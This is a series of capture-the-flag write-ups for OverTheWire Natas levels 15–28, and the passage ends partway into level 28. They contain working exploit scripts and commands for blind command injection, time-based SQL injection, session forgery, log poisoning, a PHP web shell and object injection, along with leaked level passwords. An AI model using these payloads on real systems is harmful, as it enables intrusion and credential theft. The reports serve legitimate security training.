Authentication with these credentials successfully grants access to NATAS 16.
⚠️ Security Impact

    Complete compromise of authentication secrets

    Password disclosure without direct output

    Demonstrates danger of:

        String-based SQL queries

        Missing input validation

        Informative error messages

🛡️ Mitigation Recommendations

    Use prepared statements / parameterized queries

    Avoid leaking boolean logic through responses

    Implement rate limiting

    Apply Web Application Firewall (WAF)

    Store passwords using strong hashing (bcrypt, Argon2)

🧠 Key Takeaways

    Blind SQL injection is still highly dangerous

    Boolean responses alone are sufficient for full data exfiltration

    Automated exploitation significantly reduces attack time

    Case-sensitive comparisons (BINARY) are critical in MySQL attacks



### File: NATAS-Pentest-reports/reports/natas-level-16.md

# Natas Level 15 → Level 16  
**Blind OS Command Injection via Command Substitution**

---

## 📌 Challenge Information

- **Level:** Natas 15 → Natas 16  
- **Username:** `natas16`  
- **Target URL:** http://natas16.natas.labs.overthewire.org  
- **Objective:** Extract the password for `natas17`

---

## 🔍 Source Code Analysis

Relevant backend logic:


if(preg_match('/[;|&`\'"]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}

Key Observations

The application executes a shell command via passthru()

User input is embedded inside double quotes

A blacklist filters characters: ; | & \ ' "`

Command substitution $() is NOT filtered

Output is partially controlled → blind injection scenario

⚠️ Vulnerability Identified

Blind OS Command Injection

Although classic command separators are filtered, the shell still evaluates command substitution inside double quotes:

"$(command)"


This allows arbitrary command execution without direct output.

🧠 Exploitation Strategy
Core Idea

Use $() to execute shell commands

Use grep with regex (^prefix) to test password characters

Observe behavioral differences:

Empty output → correct guess

Dictionary output → incorrect guess

This creates a boolean oracle.

🧪 Proof of Concept Payload
needle=$(grep ^E /etc/natas_webpass/natas17)


If password starts with E → grep returns output → injected string non-empty

If not → empty string → different response behavior

🔁 Automated Exploitation

Manual exploitation would be inefficient.
A Python script was used to brute-force the password character-by-character.

Charset
[a-zA-Z0-9]

Extraction Result
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC


✔️ Valid 32-character Natas password

🧰 Exploit Script
import requests
from requests.auth import HTTPBasicAuth

url = "http://natas16.natas.labs.overthewire.org/"
auth = HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

password = ""

while True:
    found = False
    for c in charset:
        payload = f'$(grep ^{password+c} /etc/natas_webpass/natas17)'
        r = requests.get(url, auth=auth, params={"needle": payload})

        if "<pre>\n</pre>" in r.text:
            password += c
            print("[+] Found:", password)
            found = True
            break

    if not found:
        break

print("Final password:", password)

🎯 Impact

Arbitrary command execution via shell

Sensitive file disclosure

Complete authentication bypass

Full compromise of next level credentials

🛡️ Mitigation Recommendations

❌ Avoid blacklist-based filtering

✅ Use escapeshellarg() for user input

✅ Avoid passthru() / shell execution

✅ Use parameterized system calls

✅ Apply allowlists instead of denylists

📚 Key Takeaways

Blacklist filtering is insufficient

Command substitution is often overlooked

Blind command injection can be as dangerous as direct RCE

Behavioral oracles are powerful exploitation primitives

🏁 Final Result
natas17 password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC

🔗 References

OWASP Command Injection

GNU Bash Command Substitution

OverTheWire Natas Wargame



### File: NATAS-Pentest-reports/reports/natas-level-17.md

# Natas Level 17 → Level 18  
**Time-Based Blind SQL Injection (MySQL)**

---

## 📌 Challenge Information

- **Level:** Natas 17 → Natas 18  
- **Username:** `natas17`  
- **Target URL:** http://natas17.natas.labs.overthewire.org  
- **Objective:** Retrieve the password for `natas18`

---

## 🔍 Source Code Analysis

Relevant backend logic:


$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
$res = mysqli_query($link, $query);

Observations

    User input is directly concatenated into the SQL query

    No input sanitization or prepared statements

    Output and error messages are fully suppressed

    Query result is not reflected to the user

➡️ This results in a blind SQL injection scenario.
⚠️ Vulnerability

Time-Based Blind SQL Injection

Because no output is returned, exploitation is only possible by observing response time differences using MySQL delay functions.
🧠 Exploitation Strategy
Time-Based Oracle

MySQL provides the SLEEP() function, which can be used conditionally:

IF(condition, SLEEP(3), 0)

    If the condition is true, the response is delayed

    If false, the response is immediate

This creates a time-based boolean oracle.
🧪 Proof of Concept Payload

" OR IF(SUBSTRING(password,1,1)='a', SLEEP(3), 0) -- 

    Delayed response → correct guess

    Immediate response → incorrect guess

🔁 Automated Password Extraction
Assumptions

    Password length: 32 characters

    Charset: [a-zA-Z0-9]

    Table schema (provided in source code):

users(username, password)

Method

    Extract password one character at a time

    Measure response time for each guess

    Append character when delay threshold is exceeded

🧰 Exploit Script

import requests
import time
from requests.auth import HTTPBasicAuth

url = "http://natas17.natas.labs.overthewire.org/"
auth = HTTPBasicAuth("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

password = ""

for i in range(1, 33):
    for c in charset:
        payload = f'" OR IF(SUBSTRING(password,{i},1)="{c}", SLEEP(3), 0) -- '
        start = time.time()
        requests.post(url, auth=auth, data={"username": payload})
        elapsed = time.time() - start

        if elapsed > 3:
            password += c
            print("[+] Found:", password)
            break

print("Final password:", password)

🏁 Result

natas18 password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ

🎯 Impact

    Full disclosure of database credentials

    Authentication bypass to next level

    Exploitable without errors or visible output

    Realistic time-based SQL injection scenario

🛡️ Mitigation Recommendations

    Use prepared statements (parameterized queries)

    Avoid string concatenation in SQL queries

    Normalize response timing to prevent timing attacks

    Do not suppress SQL errors silently

📚 Key Takeaways

    Blind SQL injection remains highly dangerous

    Time-based attacks are effective against silent applications

    Removing output does not eliminate injection risk

    Response timing can act as a powerful side-channel

🔗 References

    OWASP SQL Injection

    MySQL SLEEP() Function

    OverTheWire Natas Wargame



### File: NATAS-Pentest-reports/reports/natas-level-18.md

# Natas Level 18 – Authentication Bypass via Predictable Session IDs

## Overview

This challenge demonstrates a **Broken Authentication / Session Management** vulnerability caused by **predictable session identifiers**.

The application does not allow direct admin login, but **admin sessions already exist** on the server.  
By brute-forcing the small session ID space, it is possible to hijack an active admin session and retrieve credentials for the next level.

---

## Vulnerability Summary

### Root Cause
- Session IDs are numeric and generated using `rand(1, 640)`
- The session ID space is extremely small
- No rate limiting or session validation is implemented
- Existing admin sessions can be reused

### Impact
- Full authentication bypass
- Unauthorized access to admin-only content
- Credential disclosure

---

## Relevant Source Code

``php
$maxid = 640;

function createID($user) {
    global $maxid;
    return rand(1, $maxid);
}


 You are an admin. The credentials for the next level are:

Username: natas19
Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr



### File: NATAS-Pentest-reports/reports/natas-level-19.md

# 🔐 OverTheWire Natas18 → Natas20  
**Session Fixation & Predictable Session IDs**

---

## 📌 Overview

This level demonstrates a real-world critical flaw:

> **Session Fixation combined with Predictable Session IDs**

The application trusts client-controlled session identifiers (`PHPSESSID`) and encodes authorization state directly into the session value.

---

## 🎯 Objective

Obtain **admin access** and extract credentials for **natas20**.

---

## 🔍 Key Findings

- Session handled via `PHPSESSID`
- Session values are **predictable**
- Role (`admin`) is embedded in the session value
- Session IDs are **hex-encoded**, not random

---

## 🧠 Session Pattern Discovery

Observed cookie:

PHPSESSID=3238312d61646d696e


Decode:
``bash
echo -n "3238312d61646d696e" | xxd -r -p

Output:

281-admin

➡️ Session format:

{numeric_id}-admin

🧪 Manual Validation
❌ Regular User Session

curl -u natas19:<PASSWORD> \
  --cookie "PHPSESSID=3131392d61646d696e" \
  http://natas19.natas.labs.overthewire.org/

Decoded:

119-admin

Response:

You are logged in as a regular user.

✅ Admin Session

curl -u natas19:<PASSWORD> \
  --cookie "PHPSESSID=3238312d61646d696e" \
  http://natas19.natas.labs.overthewire.org/ | grep -i admin

Response:

You are an admin. The credentials for the next level are:
Username: natas20

⚙️ Automated Enumeration (Python)
Approach

    Enumerate session IDs 1 → 640

    Build {id}-admin

    Hex-encode value

    Test in parallel

    Detect admin response

Script

import requests
from concurrent.futures import ThreadPoolExecutor

URL = "http://natas19.natas.labs.overthewire.org/"
AUTH = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")

def check_session(i):
    sess = f"{i}-admin".encode().hex()
    r = requests.get(URL, auth=AUTH, cookies={"PHPSESSID": sess}, timeout=3)
    if "You are an admin" in r.text:
        print(f"[+] Found admin session: {i}")
        print(r.text)

with ThreadPoolExecutor(max_workers=20) as ex:
    ex.map(check_session, range(1, 640))

🏆 Result

[+] Found admin session: 281
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw



### File: NATAS-Pentest-reports/reports/natas-level-20.md

# 🧪 Natas Level 20 – Session Injection via Newline Poisoning

## 📌 Challenge Overview

**Level:** Natas 20  
**Vulnerability Type:** Session Handling / Injection  
**Core Issue:** Improper parsing of session data allowing privilege escalation  
**Technique Used:** Newline (`\n`) Injection into session storage  

---

## 🎯 Objective

Escalate privileges from a regular user to **admin** in order to retrieve credentials for **natas21**.

---

## 🔍 Source Code Analysis

From `index-source.html`, the application stores session data manually in the following format:

key value\n


Example:

name test\n


The problem:
- User input is **directly written into the session**
- Input is **not sanitized**
- Session parser splits on **newline characters**

This allows **injecting arbitrary session variables**.

---

## 💥 Vulnerability Explanation

If we submit the following value as `name`:

test
admin 1


It gets stored as:

name test
admin 1


When the session is reloaded:
- `admin 1` is parsed as a valid session key
- Application treats the user as an **admin**

This is a classic **session injection via newline poisoning**.

---

## 🧪 Exploitation Steps

### Step 1: Inject Admin Flag into Session

``bash
curl -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw \
  --cookie-jar cookies.txt \
  --data "name=test%0Aadmin%201" \
  http://natas20.natas.labs.overthewire.org/

    %0A = newline

    admin 1 becomes a new session variable

Step 2: Reuse Session Cookie

curl -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw \
  --cookie cookies.txt \
  http://natas20.natas.labs.overthewire.org/

✅ Result

Successful privilege escalation:

You are an admin.
Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH



### File: NATAS-Pentest-reports/reports/natas-level-21.md

# 🧪 Natas Level 20 & 21 — Vulnerability Report

Comprehensive security analysis of **Natas Levels 20 and 21** from the OverTheWire wargame, focusing on **session handling flaws**, **injection vectors**, and **cross-application session poisoning**.

---

## 📑 Table of Contents
- [Natas20 — Session Injection via Newline](#natas20--session-injection-via-newline)
- [Natas21 — Cross-Site Session Poisoning](#natas21--cross-site-session-poisoning)
- [Impact Assessment](#impact-assessment)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [References](#references)

---

## Natas20 — Session Injection via Newline

### 🔎 Overview

| Item | Value |
|----|----|
| Target | `http://natas20.natas.labs.overthewire.org/` |
| Credentials | `natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw` |
| Vulnerability | Session Injection |
| Severity | **High** |

---

### 🧠 Root Cause Analysis

Natas20 uses a **custom session handler** that stores session data in plaintext files:

key value\n


The vulnerability exists because **user input is written directly into the session file without sanitization**, allowing newline (`\n`) injection.

#### Vulnerable Code

``php
foreach($_SESSION as $key => $value) {
    $data .= "$key $value\n"; // ❌ No sanitization
}

💥 Exploitation Technique

By injecting a newline into the name field, an attacker can inject arbitrary session variables, including:

admin 1

🧪 Exploitation (curl)

curl -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw \
  --cookie-jar cookies.txt \
  --data "name=test%0Aadmin%201" \
  http://natas20.natas.labs.overthewire.org/

curl -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw \
  --cookie cookies.txt \
  http://natas20.natas.labs.overthewire.org/

✅ Result

You are an admin.
Username: natas21
Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH

🛡 Remediation

    Strip newline characters from user input

    Never implement custom session handlers

    Validate session structure strictly

$value = str_replace(["\n", "\r"], "", $value);

Natas21 — Cross-Site Session Poisoning
🔎 Overview
Item	Value
Main Site	http://natas21.natas.labs.overthewire.org/
Experimenter	http://natas21-experimenter.natas.labs.overthewire.org/
Credentials	natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
Vulnerability	Session Variable Injection
Severity	Critical
🧠 Architecture Flaw

Both applications share the same PHP session, but the experimenter site blindly copies all POST parameters into the session.

foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val; // ❌ No whitelist
}

💥 Attack Flow

Attacker
   │
   ▼
Experimenter Site
   │ inject admin=1
   ▼
Shared PHP Session
   │
   ▼
Main Site → Admin Access

🧪 Exploitation
Step 1 — Poison Session

curl -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH \
  -c cookies.txt \
  --data "admin=1&submit=Update" \
  http://natas21-experimenter.natas.labs.overthewire.org/

Step 2 — Reuse Session on Main Site

curl -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH \
  --cookie "PHPSESSID=$(grep PHPSESSID cookies.txt | awk '{print $7}')" \
  http://natas21.natas.labs.overthewire.org/

✅ Result

Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

🛡 Remediation

✔ Whitelist allowed session keys
✔ Separate session namespaces
✔ Never trust client-controlled parameters
✔ Implement CSRF protection

$allowed = ["align", "fontsize", "bgcolor"];

📊 Impact Assessment
Area	Impact
Confidentiality	High
Integrity	High
Availability	Low
Exploitability	Trivial
Overall Risk	Critical
🧠 Key Takeaways
Natas20

    Newline characters are dangerous

    Custom session logic is almost always flawed

Natas21

    Shared sessions across apps = disaster

    Never mass-assign request data into sessions

🧰 Tools Used

    curl

    grep, awk

    Browser DevTools

    Manual source review

📚 References

    OWASP Session Management Cheat Sheet

    CWE-20 — Improper Input Validation

    CWE-384 — Session Fixation

    PHP Session Security Documentation

🔑 Credentials Obtained

natas21: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
natas22: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

👤 Author

dra1th
⚠️ Disclaimer

This repository is for educational purposes only as part of the OverTheWire Natas wargame.



### File: NATAS-Pentest-reports/reports/natas-level-22.md

# 🧪 Natas Level 22 — Logic Flow Bypass via Premature Redirect

Security analysis of **Natas Level 22** from the OverTheWire Natas wargame, demonstrating how **server-side redirects without termination** can leak sensitive information.

---

## 📑 Table of Contents
- [Overview](#overview)
- [Vulnerability Description](#vulnerability-description)
- [Root Cause Analysis](#root-cause-analysis)
- [Exploitation](#exploitation)
- [Proof of Concept](#proof-of-concept)
- [Impact Assessment](#impact-assessment)
- [Remediation](#remediation)
- [Key Takeaways](#key-takeaways)

---

## Overview

| Item | Value |
|----|----|
| Target | `http://natas22.natas.labs.overthewire.org/` |
| Credentials | `natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz` |
| Vulnerability Type | Logic Flow / Access Control Bypass |
| Severity | **Medium → High** |

---

## Vulnerability Description

Natas22 attempts to restrict access to sensitive information by performing a **redirect** when a specific GET parameter is missing.

However, the application **does not terminate script execution** after issuing the redirect, allowing attackers to retrieve protected content by simply **ignoring the redirect**.

---

## Root Cause Analysis

### Relevant Source Code (Simplified)

``php
if (!array_key_exists("revelio", $_GET)) {
    header("Location: /");
}

❌ What Went Wrong

    header("Location: /") only sets an HTTP header

    PHP continues executing the script

    No exit() or die() is used

    Server still renders the protected content

✔ Expected Secure Logic

header("Location: /");
exit();

Exploitation

The browser normally follows redirects automatically, hiding the response body.

Command-line tools (curl, Burp, raw HTTP clients) do not follow redirects unless instructed.

This allows direct access to the protected response.
Proof of Concept
Exploit Request

curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz \
  "http://natas22.natas.labs.overthewire.org/?revelio"

Server Response

You are an admin. The credentials for the next level are:
Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs

✅ Credentials leaked despite access control logic
Impact Assessment
Factor	Impact
Confidentiality	High
Integrity	None
Availability	None
Exploit Complexity	Trivial
Authentication Bypass	Yes
Overall Risk	High
Remediation
1. Terminate Execution After Redirect

header("Location: /");
exit();

2. Enforce Server-Side Authorization Checks

if (!isset($_GET['revelio'])) {
    http_response_code(403);
    exit("Forbidden");
}

3. Never Rely on Client Behavior

    Browsers ≠ security controls

    Redirects are not access control

    Authorization must be enforced server-side

Key Takeaways

    🚨 Redirects do not stop execution

    🚨 Client-side behavior must never be trusted

    ✅ Always exit() after header("Location")

    ✅ Access control ≠ navigation logic

Credentials Obtained

natas23: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs

Tools Used

    curl

    Manual source code review

Author

dra1th
Disclaimer

This report is for educational purposes only, created as part of the OverTheWire Natas wargame.
All vulnerabilities discussed are intentionally introduced for learning secure coding and exploitation techniques.



### File: NATAS-Pentest-reports/reports/natas-level-23.md

# OverTheWire Natas – Levels 22 & 23 Write-Up

## Platform
**OverTheWire – Natas Wargame**  
URL: http://natas.labs.overthewire.org  
Focus: Web application security, PHP logic flaws

---

## Level 22

### Goal
Obtain credentials for **natas23**

---

### Initial Observation

Accessing the page normally does **not** reveal credentials.

Source code inspection shows logic similar to:

``php
if (array_key_exists("revelio", $_GET)) {
    if (!($_SESSION && $_SESSION["admin"] == 1)) {
        header("Location: /");
    }
}

However, PHP continues executing after header() unless exit() is explicitly called.
Vulnerability

Improper access control / missing execution halt after redirect

    header("Location: /") is used

    No exit() or die()

    Sensitive content is still rendered server-side

    Browsers hide it, but raw HTTP clients do not

Exploitation

Bypassing browser behavior and reading the raw response:

curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz \
"http://natas22.natas.labs.overthewire.org/?revelio"

Result

Server response reveals credentials directly:

Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs

Key Takeaway

    Redirects ≠ access control

    Always terminate execution after header()

    Never rely on client-side behavior for security

Level 23
Goal

Obtain credentials for natas24
Application Behavior

The page accepts a GET parameter:

?passwd=<value>

Source logic (simplified):

if (strpos($_REQUEST["passwd"], "iloveyou") !== false) {
    echo "The credentials for the next level are...";
}

Vulnerability

Weak string validation using substring matching

    strpos() checks for presence, not equality

    Any string containing iloveyou passes

    No strict comparison

    No hashing

    No authentication logic

Exploitation

Craft input that contains the expected string:

curl -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs \
"http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou"

Result

Server response:

Username: natas24
Password: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd

Key Takeaway

    Authentication must use exact comparison

    Never validate secrets using substring logic

    Passwords should be hashed and compared securely

    Logic flaws are often more dangerous than injections

Summary
Level	Vulnerability Type	Root Cause
22	Access Control Bypass	Missing exit() after redirect
23	Authentication Logic Flaw	Substring-based password check
Skills Demonstrated

    HTTP-level analysis

    Source code auditing

    Logic flaw exploitation

    Understanding PHP execution flow

    Bypassing client-side assumptions



### File: NATAS-Pentest-reports/reports/natas-level-24.md

# OverTheWire Natas – Level 24 Write-Up

## Platform
**OverTheWire – Natas Wargame**  
Target: http://natas24.natas.labs.overthewire.org  
Category: PHP Logic Flaw / Type Juggling

---

## Level 24

### Goal
Obtain credentials for **natas25**

---

## Application Logic

The application expects a `passwd` parameter and validates it using `strcmp()`.

Relevant source logic (simplified):

``php
if (strcmp($_REQUEST["passwd"], "somepassword") == 0) {
    echo "The credentials for the next level are...";
}

Vulnerability
Type Confusion in strcmp()

    strcmp() expects strings

    If an array is supplied instead, PHP raises a warning

    The function returns NULL

    In PHP:

    NULL == 0  // true

This results in an authentication bypass.
Root Cause

    No input type validation

    Reliance on loose comparison (==)

    Failure to enforce scalar input

    PHP’s weak typing abused via parameter injection

Exploitation

Instead of sending a string, send an array:
Payload

window.location = '?passwd[]=';

Or via CLI

curl -u natas24:<PASSWORD> \
"http://natas24.natas.labs.overthewire.org/?passwd[]="

Server Response

Warning: strcmp() expects parameter 1 to be string, array given
The credentials for the next level are:

Username: natas25
Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws

Despite the warning, authentication succeeds.
Impact

    Complete authentication bypass

    No password knowledge required

    Exploitable via browser or raw HTTP

    Trivial to automate

Security Takeaways

    Never trust input types

    Always validate with:

is_string($_REQUEST["passwd"])

Use strict comparison

    ===

    Disable error leakage in production

    Avoid PHP loose typing in security logic

CWE Mapping

    CWE-697: Incorrect Comparison

    CWE-843: Type Confusion

    CWE-20: Improper Input Validation

Summary
Issue	Result
Array injection	strcmp() failure
NULL comparison	Auth bypass
No type checks	Full compromise
This level demonstrates how language quirks, not exploits, often break authentication.



### File: NATAS-Pentest-reports/reports/natas-level-25.md

# OverTheWire Natas – Level 25 Write-Up

## Platform
**OverTheWire – Natas Wargame**  
Target: http://natas25.natas.labs.overthewire.org  
Category: Local File Inclusion (LFI) + Log Poisoning  
Severity: High

---

## Level 25 Objective
Obtain credentials for **natas26**

---

## Application Overview

The application dynamically includes language files based on the `lang` parameter:

index.php?lang=en
index.php?lang=de


A weak directory traversal filter attempts to sanitize user input.

---

## Vulnerability Chain

### 1️⃣ Local File Inclusion (LFI)

The application includes files like:

`php
include("language/" . $_GET['lang']);

A naive traversal filter removes ../ but does not block absolute or reconstructed paths.

This allows access to internal files such as:

/var/log/natas25.log

2️⃣ Log Poisoning

The application logs:

    User-Agent

    Requests that trigger traversal attempts

Example log entry:

[13.01.2026 20::39:44] curl/8.18.0-rc3 "Directory traversal attempt! fixing request."

If PHP code is injected into headers (User-Agent), it will be written to the log file.
Exploitation Strategy
Step 1 – Inject PHP Payload into Log

Send a request with a malicious User-Agent:

<?php system('cat /etc/natas_webpass/natas26'); ?>

This payload is written into /var/log/natas25.log.
Step 2 – Include the Log File via LFI

Request the poisoned log file using the vulnerable lang parameter:

curl -u natas25:<PASSWORD> \
"http://natas25.natas.labs.overthewire.org/?lang=....//....//....//var/log/natas25.log"

Automation

A Bash exploit was created to:

    Extract session ID

    Poison the log

    Include the log automatically

Execution

chmod +x exploit.sh
./exploit.sh

Successful Response

The server executes the injected PHP payload and returns:

Username: natas26
Password: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE

Impact

    Arbitrary file read

    Remote code execution (via PHP execution in logs)

    Full credential disclosure

    Chained vulnerability exploitation

Root Causes
Issue	Description
Weak input sanitization	../ removal only
Unsafe file inclusion	User-controlled include path
Log exposure	Log files readable via LFI
PHP execution	Logs parsed as PHP
CWE Mapping

    CWE-98 – Improper Control of Filename for Include

    CWE-22 – Path Traversal

    CWE-94 – Code Injection

    CWE-532 – Information Exposure via Logs

Security Recommendations

    Use a strict whitelist for include files

    Never include user input directly

    Disable PHP execution in log directories

    Store logs outside web-accessible paths

    Use realpath() validation

Key Takeaway

This level demonstrates a classic real-world attack chain:

    LFI + Log Poisoning = RCE

Many production systems still fail exactly this way.



### File: NATAS-Pentest-reports/reports/natas-level-26.md

# OverTheWire Natas – Level 26 Write-Up

## Platform
**OverTheWire – Natas Wargame**  
Target: http://natas26.natas.labs.overthewire.org  
Category: PHP Object Injection → Arbitrary File Write → RCE  
Severity: Critical

---

## Level 26 Objective
Obtain credentials for **natas27**

---

## Application Overview

The application allows users to draw on an image canvas.  
User drawings are stored inside a **serialized PHP object** saved in a cookie named:

drawing


This cookie is later **unserialized without validation**.

---

## Root Vulnerability

### 🔴 Unsafe PHP Deserialization

User-controlled serialized data is passed directly to:

``php
unserialize($_COOKIE['drawing']);

This enables PHP Object Injection.
Vulnerable Class

From the source code:

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __destruct() {
        file_put_contents($this->logFile, $this->exitMsg, FILE_APPEND);
    }
}

Impact

    $logFile is attacker-controlled

    $exitMsg is attacker-controlled

    Destructor writes arbitrary content to arbitrary files

➡️ Arbitrary File Write achieved
Exploitation Strategy
Step 1 – Craft Malicious Serialized Object

A malicious Logger object is created with:

    logFile → img/shell.php

    exitMsg → PHP web shell

Payload example:

<?php system($_GET['cmd']); ?>

Step 2 – Generate Serialized Payload

Exploit script (exploit.php) generates the payload:

php exploit.php

Output:

Set this as your 'drawing' cookie:
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL3NoZWxsLnBocCI7...

Step 3 – Send Payload via Cookie

Set the cookie in the browser or using curl:

drawing=<SERIALIZED_PAYLOAD>

Once the request ends, the __destruct() method executes.

➡️ img/shell.php is created on the server.
Remote Code Execution

Access the shell:

curl -u natas26:<PASSWORD> \
"http://natas26.natas.labs.overthewire.org/img/shell.php?cmd=cat+/etc/natas_webpass/natas27"

Successful Result

Username: natas27
Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne

Attack Chain Summary
Step	Technique
1	PHP Object Injection
2	Arbitrary File Write
3	Web Shell Upload
4	Remote Code Execution
5	Credential Disclosure
Root Causes
Issue	Description
Unsafe unserialize	No integrity or type validation
Dangerous destructor	File write in __destruct()
Writable web directory	img/ allows PHP execution
No cookie signing	Payload tampering undetected
CWE Mapping

    CWE-502 – Deserialization of Untrusted Data

    CWE-94 – Code Injection

    CWE-73 – External Control of File Name or Path

    CWE-915 – Improperly Controlled Modification of Object Prototype

Security Recommendations

    Never unserialize() untrusted data

    Use JSON instead of PHP serialization

    Sign cookies with HMAC

    Avoid file operations in destructors

    Disable PHP execution in upload directories

Key Takeaway

    PHP Object Injection is often underestimated,
    but when combined with magic methods, it becomes full RCE.

This pattern still exists in real production systems.



### File: NATAS-Pentest-reports/reports/natas-level-27.md

# OverTheWire Natas – Level 27 Write-Up

## Platform
**OverTheWire – Natas Wargame**  
Target: http://natas27.natas.labs.overthewire.org  
Category: Authentication Bypass / Logic Flaw  
Severity: High

---

## Level 27 Objective
Obtain credentials for **natas28**

---

## Application Overview

The application allows users to:
- Create a new account (`username`, `password`)
- Log in with existing credentials

User data is stored in a backend database (MySQL).

---

## Root Vulnerability

### 🔴 Inconsistent Username Handling (Trailing Whitespace)

The application:
- **Allows creation of usernames with trailing spaces**
- **Trims usernames differently during login and lookup**

This results in **multiple logical identities mapping to the same canonical username**.

---

## Key Observation

MySQL behavior:
- `VARCHAR` fields **ignore trailing spaces** in comparisons
- `"natas28"` == `"natas28        "`

Application behavior:
- Registration: stores padded username
- Login: trims username before lookup

➡️ **Authentication logic breaks**

---

## Exploitation Strategy

Exploit the mismatch between:
- Stored username (with padding)
- Queried username (trimmed)

---

## Step-by-Step Exploitation

### Step 1 – Create a Padded Username

Create a user that visually looks like `natas28`, but contains trailing spaces:

``bash
curl -u natas27:<PASSWORD> \
  --data "username=natas28                                                         X&password=test123" \
  http://natas27.natas.labs.overthewire.org/

Result:

User natas28                                                         X was created!

This user is stored as a distinct row, but shares the same logical identity.
Step 2 – Create a Second Variant

curl -u natas27:<PASSWORD> \
  --data-urlencode "username=natas28                                                         Y" \
  --data "password=mypass123" \
  http://natas27.natas.labs.overthewire.org/

Now multiple padded versions exist.
Step 3 – Login Using Trimmed Username

Login without suffix, but with padding only:

curl -u natas27:<PASSWORD> \
  --data-urlencode "username=natas28                                                         " \
  --data "password=mypass123" \
  http://natas27.natas.labs.overthewire.org/

Successful Result

The application authenticates the user and leaks internal data:

Welcome natas28!
Here is your data:
Array
(
    [username] => natas28
    [password] => 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
)

Extracted Credentials

Username: natas28
Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj

Vulnerability Summary
Issue	Description
Username canonicalization bug	Trailing spaces inconsistently handled
Authentication logic flaw	Registration ≠ login normalization
MySQL string comparison	Trailing spaces ignored
No uniqueness enforcement	Multiple logical duplicates allowed
CWE Mapping

    CWE-287 – Improper Authentication

    CWE-20 – Improper Input Validation

    CWE-178 – Improper Handling of Case Sensitivity / Whitespace

    CWE-305 – Authentication Bypass by Alternate Name

Real-World Impact

This class of bug can lead to:

    Account takeover

    Privilege escalation

    Password disclosure

    Shadow accounts

⚠️ This issue exists in real production apps, especially legacy PHP + MySQL systems.
Security Recommendations

    Normalize usernames before storage

    Enforce uniqueness on canonical form

    Reject trailing whitespace explicitly

    Use strict string comparison

    Log normalization mismatches

Key Takeaway

    Authentication is not crypto — it’s logic.
    And logic bugs scale better than exploits.



### File: NATAS-Pentest-reports/reports/natas-level-28.md

# 🔐 NATAS28 — Cryptography Abuse → SQL Injection

> **Impact:** Full database password disclosure  
> **Root Cause:** Misuse of symmetric encryption (AES-ECB) without integrity protection  
> **Technique:** Ciphertext block manipulation + SQL injection  
> **Level:** Advanced Web Exploitation / Crypto Logic Abuse

---

## 📌 Overview

NATAS28 implements server-side encryption of user input before using it in an SQL query.  
While the intention is to “secure” the query, the application **decrypts and executes attacker‑controlled ciphertext**, enabling a **post‑decryption SQL injection**.

This challenge demonstrates why **encryption without authentication is not security**.

---

## ⚠️ Vulnerability Summary

- User input is encrypted using a **block cipher (AES-ECB, 16‑byte blocks)**
- Encrypted data is passed via URL and later decrypted server‑side
- No integrity or authenticity validation is performed
- Ciphertext blocks can be **cut, reordered, and replayed**
- Resulting plaintext becomes a valid **SQL injection payload**

---

## 🔬 Encryption Behavior Analysis

Testing different input lengths reveals block-based encryption:

``text
Input Length 1–12   → 5 blocks
Input Length 13–28  → 6 blocks
Input Length 29–44  → 7 blocks

This confirms:

    16‑byte block size

    Deterministic encryption (ECB mode)

    Fixed query prefix before user input

🧠 Exploitation Strategy
1️⃣ Control the Plaintext Layout

Craft input so that SQL injection starts exactly at a block boundary.

AAAAAAAAA' UNION SELECT password FROM users#

2️⃣ Encrypt Legitimate + Malicious Queries

Obtain encrypted ciphertexts for:

    A benign placeholder query

    A malicious SQL injection query

